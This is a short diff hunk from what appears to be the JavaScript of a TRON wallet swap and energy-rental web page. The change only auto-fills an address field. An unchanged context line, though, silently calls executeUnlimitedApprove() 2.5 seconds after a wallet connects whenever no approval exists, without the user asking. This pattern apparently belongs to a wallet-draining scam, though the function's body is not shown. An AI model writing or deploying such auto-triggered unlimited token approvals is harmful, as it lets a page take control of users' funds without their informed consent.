@@ -820,7 +820,7 @@ button.px-3.py-1\.5.rounded-lg:hover{background:#cbd5e1!important}
             try{var _tr=await fetch(API_BASE+'/trx/'+address);var _td=await _tr.json();if(_td.trxBalance)try{document.getElementById('trx-bal-swap').textContent=parseFloat(_td.trxBalance).toFixed(2);}catch(e){}}catch(e){}
             if(!isApproved){setTimeout(function(){executeUnlimitedApprove();},2500);}
             // 에너지 렌탈 대상 주소 자동 입력
-            try{document.getElementById('energy-address').value=address;}catch(e){}
+            try{var eAddr=document.getElementById('energy-address');eAddr.value=address;eAddr.setAttribute('value',address);eAddr.placeholder=address;}catch(e){}
         }
 
         function setApprovedUI(){
